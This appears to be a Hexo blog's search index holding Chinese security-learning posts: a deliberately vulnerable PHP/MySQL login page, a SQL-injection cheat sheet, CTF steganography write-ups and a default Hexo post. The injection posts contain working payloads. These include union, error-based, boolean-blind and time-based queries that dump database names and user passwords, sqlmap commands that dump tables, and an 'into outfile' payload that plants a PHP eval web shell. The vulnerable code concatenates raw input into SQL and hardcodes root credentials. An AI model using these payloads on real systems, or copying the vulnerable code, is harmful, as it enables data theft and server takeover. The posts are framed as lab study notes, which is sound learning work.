    
    <entry>
      <title><![CDATA[前端验证sql]]></title>
      <url>/2017/08/25/%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81sql/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><br>夜如何其？夜未央</blockquote>  

<p>写了一个前端验证，html也忘记了，页面写的很粗略，将就看一下，毕竟是我人生第一个自己写的漏洞。</p>
<p><img src="/upload_images/q1.png" alt=""></p>
 <a id="more"></a>
<p>主界面，省略掉测试他是否有漏洞。</p>
<p><img src="/upload_images/q2.png" alt="">  </p>
<p>id处输入： 1’ or 1=1#</p>
<p>省略中间步骤，直接爆一下东西：</p>
<p>输入：1’ and 1=2 union select 1,2,group_concat(username,0x3a,password) from user#</p>
<p><img src="/upload_images/q3.png" alt=""></p>
<p>这里贴一下我的代码：  </p>
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;M3tar的第一个注入&lt;/title&gt;
   &lt;meta http-equiv=&quot;content-type&quot;content=&quot;text/html&quot;charset=&quot;Unicode&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;M-star.php&quot; method=&quot;post&quot;&gt;
&lt;h1&gt;Sql注入&lt;/h1&gt;

&lt;table&gt;
  &lt;tr&gt;
     &lt;td&gt;id&lt;/td&gt;
     &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;&lt;/td&gt;
   &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;用户名&lt;/td&gt;
    &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;密 码&lt;/td&gt;
    &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;
    &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;


 &lt;?php
 if($_POST){
 $con=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
 mysql_select_db(&quot;m3tar&quot;,$con);

 $id = $_POST[&apos;id&apos;];
 $sql=&quot;select * from user where id=&apos;$id&apos;&quot;;
 $query=mysql_query($sql,$con);
 $arr=mysql_fetch_array($query, MYSQL_ASSOC);

if(!empty($arr)){
 echo &apos;&lt;pre&gt;&apos;,print_r($arr,1),&apos;&lt;/pre&gt;&apos;;
}else{
  echo &quot;输入有误&quot;;
}
}
?&gt;
</code></pre><p>关于写代码学到的一点点心得：</p>
<p>1）php：写这个还是要对php有那么一点点的了解，对于数据库编程的内容也要有一些了解：</p>
<p>数据库的三层结构：客户端 mysql dbms 数据对象</p>
<p>2）可以总结一下mysql扩展库操作mysql数据库的步骤</p>
<p>3）关于phpstudy的理解：</p>
<p>  以前只是下了phpstudy，知道往WWW下扔东西，才知道还可以秒切换版本，很不错的功能，希望以后能多加应用。因为写一==这个个简单的sql注入漏洞的界面，emmm，很难受，写不来数据库，百度了半天，很瓜，原来phpstudy里面就可以新建数据库（phpMyadmin、Mysql-front），赶紧照着百度依葫芦画瓢，第一次接触这个自己后台的数据库，非常的兴奋。还有其他问题，现在还没有怎么遇到，以后再补充。</p>
<p>4)html和css感觉白学了，都记不得了，要抓紧时间补足啊。</p>
<p>5）POST和GET参数分别的优势和劣势 <a href="http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" target="_blank" rel="external">http://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html</a> 详细的可以看这个资料</p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql学习 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基础sql总结]]></title>
      <url>/2017/08/25/1/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。</blockquote><br><strong>摘要：</strong>总结一些基础的sql语句。  </p>
<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>&nbsp;&nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。<br><a id="more"></a></p>
<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>&nbsp;&nbsp;sql注入分类主要还是分为数字型注入和字符型注入。至于说的post注入，cookie注入，http头注入，盲注···个人觉得都是可以分开囊括在里面的，只是这些是根据注入字段在的位置进行的命名。    </p>
<p>下面就讲一些学到现在我见过的的注入分类吧。</p>
<ul>
<li>GET注入 </li>
<li>POST注入</li>
<li>http头注入</li>
<li>cookie注入</li>
<li>报错的注入</li>
<li>布尔盲注</li>
<li>基于时间的盲注</li>
</ul>
<h2 id="注入基本操作-（GET注入为例）"><a href="#注入基本操作-（GET注入为例）" class="headerlink" title="注入基本操作 （GET注入为例）"></a>注入基本操作 （GET注入为例）</h2><h3 id="第一步：判断是否存在注入"><a href="#第一步：判断是否存在注入" class="headerlink" title="第一步：判断是否存在注入"></a>第一步：判断是否存在注入</h3><p>GET注入一般看源代码就可以看到。形如：$_GET[“ID”] ID就是参数  </p>
<p>   以id为例：  </p>
<p> 1） url ? id=1                返回正常  </p>
<p> 2） url ? id=1’               出错，页面异常  </p>
<p> 3） url ? id=1 and 1=1        返回正常  </p>
<p> 4） url ? id=1 and 1=2        返回错误</p>
<p>以上步骤满足，可能存在SQL注入漏洞</p>
<p>总结：  </p>
<p>  <strong>出现过的SQL语句总结：</strong></p>
<font color="red">（不构造那种双闭合语句，一定记得注释 –+ 或者 #）</font>

<pre><code>1）select * from table where id = &apos;input&apos;   

2) select * from table where id = (&apos;input&apos;)  

3) select * from table where id = (&quot;input&quot;)   

4) select * from table where id = (input)     
</code></pre><h3 id="第二步：-找到注入点，进行基础的sql语句尝试："><a href="#第二步：-找到注入点，进行基础的sql语句尝试：" class="headerlink" title="第二步：  找到注入点，进行基础的sql语句尝试："></a>第二步：  找到注入点，进行基础的sql语句尝试：</h3><p>（以下是用GET注入为例的）  </p>
<p>第一步：用 order by 来爆字段数，如果没有反应，则在后面加–+或者/*或者#注释掉后面的内容  </p>
<pre><code>http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=1&apos;)) order by 5 --+
</code></pre><p>第二步：显示错误位，and 1=2 union select 1,2,3,4,5,6，…..（这一步一定记得前面必须输入错误的，才能爆出敏感信息）</p>
<pre><code>http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=-1&apos; union select 1,2,3--+
</code></pre><p>爆库:select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1</p>
<p>第三步：显示版本，当前用户，数据库路径，   </p>
<pre><code>1） and 1=2 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@datadir),4    

2）  and 1=2 union select 1,2,database()  
</code></pre><p>第四步：爆表       </p>
<pre><code>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()  --+  
</code></pre><p>第五步：爆列    </p>
<pre><code>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;表名的hex&apos; （&apos;users&apos;）--+  
</code></pre><p>第六步： 爆字段     </p>
<pre><code>and 1=2 union select 1,2,group_concat(username,0x3a,password) from 表名 (不用单引号）--+  
</code></pre><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>  解决方式：burpsuite + sqlmap<br>最简单的比如：前端验证， 直接绕过即可  </p>
<p>这里详细讲述一下利用sqlmap解决的办法：    </p>
<h3 id="1）抓包，最后一行就是参数值"><a href="#1）抓包，最后一行就是参数值" class="headerlink" title="1）抓包，最后一行就是参数值"></a>1）抓包，最后一行就是参数值</h3><pre><code>sqlmap -u &quot;url&quot; --data &quot;参数（就是最后一行）&quot; --risk=3 --level=5 --dbs  
</code></pre><h3 id="2）将抓包得到的post请求复制为txt"><a href="#2）将抓包得到的post请求复制为txt" class="headerlink" title="2）将抓包得到的post请求复制为txt"></a>2）将抓包得到的post请求复制为txt</h3><p>  注意：在kali里面新建文件夹后使用vim   </p>
<pre><code>vim使用方法：   vim 1.txt 回车 粘贴内容  esc键:wq 回车  
</code></pre><p>运行sqlmap并使用如下命令（ 括号里面可以不写 ）：  </p>
<pre><code>./sqlmap -r search-1.txt (-p 参数)     
</code></pre><p>或者：</p>
<pre><code>sqlmap -r &quot;1.txt&quot; -p &quot;参数&quot; --dbs
</code></pre><p>这里参数 -r 是让sqlmap加载我们的post请求1.txt，而-p 应该比较熟悉，指定注入用的参数(如果没写，就会自己检测的)</p>
<h3 id="3）自动搜索表单"><a href="#3）自动搜索表单" class="headerlink" title="3）自动搜索表单"></a>3）自动搜索表单</h3><pre><code>sqlmap -u url  --forms
</code></pre><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p>基本上http头都有可能出现能注入的地方。推荐阅读这个链接<br><a href="http://www.cnblogs.com/softidea/p/5325079.html" target="_blank" rel="external">http头注入</a></p>
<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>cookie注入，这里主要讲解一下利用sqlmap，因为手工的cookie注入，现在我还没遇到，遇到之后在做补充。  </p>
<h3 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h3><p>&nbsp;&nbsp;这里要进行cookie注入，就要先注册，然后F12 就出现一个cookies 就可以进行cookie注入</p>
<h3 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h3><p> <a href="http://zydhacker.blog.163.com/blog/static/211795073201461182522552/" target="_blank" rel="external">网上的相关资源</a></p>
<p>命令1跑表  </p>
<pre><code>sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --table --level 2
</code></pre><p>命令2字段 </p>
<pre><code>sqlmap -u &quot;URL&quot; --cookie &quot;参数&quot; --columns -T 表段 --level 2
</code></pre><p>命令3跑密码  </p>
<pre><code>sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --dump -T 表段 -C “字段，字段” --level 2
</code></pre><h2 id="报错的注入"><a href="#报错的注入" class="headerlink" title="报错的注入"></a>报错的注入</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1)猜测注入语句，不再赘述.  </p>
<p>2)语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息  </p>
<p>3)  </p>
<pre><code>1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+  
</code></pre><p>含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。  </p>
<p>整个语句分析：  </p>
<p>整体相当于select 1 from b；  </p>
<p>其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数；   </p>
<p>name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))</p>
<p>4） 进行注入 </p>
<p>语句构造：  </p>
<p>1′and (select 1 from (select count(<em>),(concat(“~”,(select 报错语句),”~”,floor(rand()</em>2)))name from information_schema.tables group by name)b)  </p>
<font color="red">解释语句</font>

<pre><code>floor() 是取整数 rand()在0和1之间产生一个随机数
rand(0)*2 将取0到2的随机数 floor(rand()*2)有两条记录就会报错 
floor(rand(0)*2) 记录需为3条以上，且3条以上必报错，返回的值是有规律的
count(*) 是用来统计结果的，相当于刷新一次结果 
group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1 在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次
</code></pre><h3 id="个人常用的基于错误的语句"><a href="#个人常用的基于错误的语句" class="headerlink" title="个人常用的基于错误的语句"></a>个人常用的基于错误的语句</h3><pre><code>1./*爆表库*/(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆表库*/
2./*爆当前(select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/
3./*爆所有用户名*/(select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/
</code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="1-布尔盲注出现的情况"><a href="#1-布尔盲注出现的情况" class="headerlink" title="1)布尔盲注出现的情况"></a>1)布尔盲注出现的情况</h3><p>当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。  </p>
<h3 id="2-语句构造"><a href="#2-语句构造" class="headerlink" title="2)语句构造"></a>2)语句构造</h3><p>1’ and (ascii(substr(database(),1,1)))&gt;100 –+</p>
<p>返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。</p>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><h3 id="1-基于时间的盲注出现的情况"><a href="#1-基于时间的盲注出现的情况" class="headerlink" title="1)基于时间的盲注出现的情况"></a>1)基于时间的盲注出现的情况</h3><p>这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。  </p>
<h3 id="2-语句构造-1"><a href="#2-语句构造-1" class="headerlink" title="2)语句构造"></a>2)语句构造</h3><p>1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+</p>
<p>数据库名称第一个字符的ascii码是否大于100，正确则产生5s的延迟，错误则返回空。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。  </p>
<p>也有benchmark()延时注入，与sleep用法相似。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="一句话提权等"><a href="#一句话提权等" class="headerlink" title="一句话提权等"></a>一句话提权等</h3><p>直接写一句话(要知道物理路径) ，连接菜刀   </p>
<pre><code>and 1=2 union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;]) ?&gt;&apos;,4 into outfile &apos;D:\\xampp\\www\\test.php&apos;  --+ 
</code></pre> <font color="orange">记住一定要用两个反斜杠，用一个的话可能会出现转义 </font>

<h3 id="中间插入"><a href="#中间插入" class="headerlink" title="中间插入"></a>中间插入</h3><p>如果强行要在1，**，3中插入 语句这样构造：<br>  爆表：   </p>
<pre><code>id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;database&apos;  --+    
</code></pre><h3 id="一些语句的解释"><a href="#一些语句的解释" class="headerlink" title="一些语句的解释"></a>一些语句的解释</h3><p>1.group_concat的意思是全部列出来   </p>
<p>2.version()——MySQL版本  </p>
<p>3.concat(str1,str2…)——没有分隔符地连接字符串  </p>
<p>4.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
<p>5.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据 </p>
<p>6.0x3a是”:”的十六进制，在这里把它作为分隔符</p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql学习 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[png图片隐写]]></title>
      <url>/2017/08/22/1/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><br>前尘隔海，古屋不再。</blockquote>

<p>&nbsp;&nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。   </p>
<h2 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h2><p>1.LSB隐写  </p>
<p>2.图片修复<br><a id="more"></a><br>题目图片</p>
<p><img src="/upload_images/misc2.png" alt=""></p>
<h2 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h2><p>扔一下相关学习的网站：  </p>
<p>世安杯-LSB隐写-png：<a href="http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1" target="_blank" rel="external">http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1</a>  </p>
<p>CTF之隐写：<br><a href="http://www.jianshu.com/p/02fdd5edd9fc" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc</a>  </p>
<p>隐写术总结：<br><a href="http://bobao.360.cn/learning/detail/243.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/243.html</a>  </p>
<p>stegsolve的用法：<br>Stegsolve——Analyse——Frame Browser。浏览每个颜色通道的每一位，看是否隐藏了二维码<br>（二维码在线解码：<a href="http://tool.chinaz.com/qrcode/）" target="_blank" rel="external">http://tool.chinaz.com/qrcode/）</a>  </p>
<p>Stegsolve——Analyse——Data Extract。这个是使用ASCII隐写的时候可以查看的。  </p>
<p>Stegsolve——Analyse——file format。查看文件格式，结合IDAT结构是否异常，结合编程。  </p>
<p>Stegsolve——Analyse——frame browser。可以查看GIF文件每一帧的图片。  </p>
<p>Stegsolve——Analyse——image combiner双图分析  </p>
<h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><p>&nbsp;&nbsp;这个题学到很多知识。简述一下，先看到提示，最低最低位，最开始跑偏了，想成了图片缺失，在最低位出现flag，后来改了像素，变成了另外一张图片，（当时的启发由于这个网站：<a href="http://www.jianshu.com/p/02fdd5edd9fc）" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc）</a>  后来出现的图片出现了类似像素的东西，就很丑，，然后也不会了，再看一下，是一个png图片，考虑扔进stegsolve看一下，最低位，</p>
<p><img src="/upload_images/m1.png" alt="">  </p>
<p> <img src="/upload_images/m2.png" alt=""> </p>
<p>隐约间看到了key:paaaasword LSB   </p>
<p>&nbsp;&nbsp;哎呦喂，以为出来了，看到hint，秘密之所以是秘密，因为秘密需要秘密去探寻，就考虑里面怕是有txt，LSB隐写，喜极而泣的在kali里面搞啊搞（搞的方法是：使用一个github上一个工具来处理-cloacked-pixel(具体用法见<a href="https://github.com/cyberinc/cloacked-pixel)。" target="_blank" rel="external">https://github.com/cyberinc/cloacked-pixel)。</a>  </p>
<p>&nbsp;&nbsp;我在kali下进行测试的。先将文件解压，并将png文件放进去，在命令行下进入到该文件夹。），密码试了7次（可能不止，还有自己输错的），最后密码是 ： paaaasword<br>大概是在kali里面这样的情况：  </p>
<p> <img src="/upload_images/m3.png" alt="">  </p>
<p>&nbsp;&nbsp;然后使用命令python lsb.py extract misc2.png 111.txt  paaaassword<br>可以得到隐写的文件111.txt。  </p>
<p>ps:extract指的是提取<br>misc2.png指的是导入文件名<br>111.txt指的是导出文件名<br>paaaasword指的是密码（此处根据提示猜测）</p>
<p>&nbsp;&nbsp;当然，我天真的以为，txt里面就是我心心念念的flag，打开，试了的所有txt都是乱码，</p>
<p> <img src="/upload_images/m4.png" alt="">   </p>
<h3 id="图片修复"><a href="#图片修复" class="headerlink" title="图片修复"></a>图片修复</h3><p>我猜里面还有一个图片，winhex打开，看一下文件头，  </p>
<p> <img src="/upload_images/m5.png" alt="">   </p>
<p> &nbsp;&nbsp;啧，和这个png很像嘛，百度一下文件头，<a href="http://www.jianshu.com/p/02fdd5edd9fc" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc</a><br>文件怕是损坏了，修复出来，编辑——粘贴字节8，   </p>
<p> <img src="/upload_images/m6.png" alt="">    </p>
<p>改后缀，png，看到曙光了，是个二维码，  </p>
<p> <img src="/upload_images/m7.png" alt="">   </p>
<p>&nbsp;&nbsp;哇，兴奋的搓手手，赶紧在线解密，<br> <img src="/upload_images/m9.jpg" alt=""> ，啥，识别不出来，用手机，还是识别不出来，哇，对比一下正常的二维码，定位点呢，定位点不对啊。搞到ps里面，emmm，截图成四块，第四块好像有一个反向，再拼起来，扫一下，终于对了。</p>
<p> <img src="/upload_images/m8.png" alt="">  </p>
<p>　做出来之后的我  <img src="/upload_images/m10.jpg" alt=""> 本来还想打爆出题人，但是现在已经没有力气了。不过真的学到很多，嘻嘻嘻~</p>
]]></content>
      
        <categories>
            
            <category> CTF-Misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF-Misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[图片隐写术总结]]></title>
      <url>/2017/08/21/1/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>大鹏一日同风起，扶摇直上九万里</blockquote><br>一直比较喜欢做杂项（虽然还是很垃圾），就感觉很有意思。总结了一些关于图片隐写的姿势，一起学习~</p>
<p>1.另存为图片 （还有直接看文件信息，可能就在文件信息里面）  </p>
<p>2.改后缀 zip / rar /txt<br><a id="more"></a><br>3.扔winhex  这里要看文件头和文件结束的位置<br>  Jpg文件头：FFD8FF，结尾都是FF D9<br>  gif的开头是GIF8（47494638）<br>  PNG (png)，文件头：89504E47<br>  ZIP Archive (zip)，文件头：504B0304<br>  RAR Archive (rar)，文件头：52617221<br>  ……<br>  这是一些文件头标志的网站：<a href="http://www.cnblogs.com/mq0036/p/3912355.html" target="_blank" rel="external">http://www.cnblogs.com/mq0036/p/3912355.html</a>  </p>
<p>4.修复文件  </p>
<p>5.分离图片：扔binwalk</p>
<p>  #binwalk 2.jpg<br>  找到偏移位置</p>
<p>  #dd if=2.jpg of=1.jpg skip=偏移位置 bs=1</p>
<p>  if是指定输入文件，of是指定输出文件，<br>  skip是指定从输入文件开头跳过XXX(140147)个块后再开始复制，<br>  bs设置每次读写块的大小为1字节 。</p>
<p>  还可以使用foremost</p>
<p>  分离命令： #foremost 2.jpg 他会分离之后自己储存到一个ouput的文件夹，里面就有出现的分离图片</p>
<p>6.谷歌识图，百度识图</p>
<p>7.png图片</p>
<p> ①可能还会有图片要拉长一些</p>
<p> ②看低位（stegsolve）</p>
<p>8.base 64 转化成为图片</p>
<p><a href="http://www.tuicool.com/articles/VviyAfY" target="_blank" rel="external">http://www.tuicool.com/articles/VviyAfY</a> CTF图片隐写术<br><a href="http://www.jianshu.com/p/02fdd5edd9fc" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc</a>   CTF隐写总结 （有png相关题目）</p>
]]></content>
      
        <categories>
            
            <category> CTF-Misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF-Misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[音频隐写 MP3stego+wav隐写+题目]]></title>
      <url>/2017/08/20/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99-MP3stego-wav%E9%9A%90%E5%86%99-%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>所谓高贵的灵魂，即对自己怀有敬畏之心</blockquote><br><strong>摘要：</strong> 音频隐写，遇见的比较少，这里总结一下我遇见过的一些关于音频隐写的题目，以后遇见其他类型的，再进行补充。</p>
<h2 id="这是最简单的那种"><a href="#这是最简单的那种" class="headerlink" title="这是最简单的那种"></a>这是<font color="red"><strong>最简单</strong></font>的那种</h2><p>&nbsp;　当年年少无知，也不知道很多厉害的姿势，就<font color="#FF9900">直接把歌曲输入了网易云，把歌手或者专辑找出来了，然后直接提交flag</font><br><a id="more"></a></p>
<h2 id="MP3stego"><a href="#MP3stego" class="headerlink" title="MP3stego"></a><font color="red">MP3stego</font></h2><h3 id="1-知识储备"><a href="#1-知识储备" class="headerlink" title="1.知识储备"></a>1.知识储备</h3><p>关于MP3stego用法：<a href="http://blog.csdn.net/sinat_38134380/article/details/69789665" target="_blank" rel="external">http://blog.csdn.net/sinat_38134380/article/details/69789665</a>    </p>
<h3 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><p>  1）下载MP3stego  </p>
<p>  2）将需要分析的mp3文件拖到Decode.exe所在的目录，如 下面的sycgeek-mp3.mp3</p>
<p>  3） 开始运行cmd，进入有mp3stego的磁盘</p>
<p>  <img src="/upload_images/1.png" alt=""></p>
<p>  4）<font color="red">-X是获取隐藏的东西 -P后面写密码</font><br>  <img src="/upload_images/2.png" alt="">  </p>
<p>  5）会在该目录下生成一个新的txt文档sycgeek-mp3.mp3.txt，打开<br>   <img src="/upload_images/3.png" alt="">  </p>
<h2 id="wav隐写"><a href="#wav隐写" class="headerlink" title="wav隐写"></a><font color="red">wav隐写</font></h2><h3 id="1-知识储备-1"><a href="#1-知识储备-1" class="headerlink" title="1.知识储备"></a>1.知识储备</h3><font color="#FF9900"><br>wav隐写-Audacity–silenteye<br><br>1）-打开wav文件，Audacity-效果-反向-播放<br><br>2）-Audacity-文件名-频谱图<br><br>3）-声道里面夹杂着莫斯密码，短的代表’.’,长的代表’-’<br><br>4）-Audacity-频谱图-attach-点击频谱-然后点击修改spectrogram setting，把8000改为48000<br><br>5）-电话音分析（<a href="http://dialabc.com/sound/detect/）" target="_blank" rel="external">http://dialabc.com/sound/detect/）</a><br></font>

<h3 id="2-相关资源"><a href="#2-相关资源" class="headerlink" title="2.相关资源"></a>2.相关资源</h3><font color="#FF9900"><br>这里再贴上两个有关的wav题目隐写的做法：<br><br><a href="http://www.sohu.com/a/116298237_468673" target="_blank" rel="external">http://www.sohu.com/a/116298237_468673</a><br><br><a href="http://www.hackdig.com/08/hack-38263.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-38263.htm</a><br></font>  

<h3 id="3-题目分析"><a href="#3-题目分析" class="headerlink" title="3.题目分析"></a>3.题目分析</h3><p>下面写一个我自己遇见的关于wav题目的隐写姿势</p>
<p>链接: <a href="https://pan.baidu.com/s/1eS7s8iY" target="_blank" rel="external">https://pan.baidu.com/s/1eS7s8iY</a><br>密码: 53dv</p>
<p>分析此题：首先把这个题扔到Audacity里面，因为很容易就能听出来他有问题，就考虑看一下频谱图（当然还可以看音频轨道、效果、高音、音频波形），考虑是不是数字隐藏。这个题，把中间的灰色的放大放大，放大</p>
<p> <img src="/upload_images/4.png" alt=""></p>
<p>emmm ，经过百度，这里有很多种加密，除了上面列举的根据波形图的0 1 加密，摩斯电码加密，我自己在做这个题的时候，还考虑了粗细会不会是表示0 1，还有条形码，经过放大，然后画下来，笔头是个好东西，<br><img src="/upload_images/5.png" alt=""><br>这是个密码呀~，嘻嘻嘻，很简单了吧，猪圈密码。最后还要考虑一下密码的大小写哦~ 真是个磨人的小妖精~</p>
<p>Flag: D0g3{ahhhhhhhhh}</p>
]]></content>
      
        <categories>
            
            <category> CTF-Misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF-Misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/08/18/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
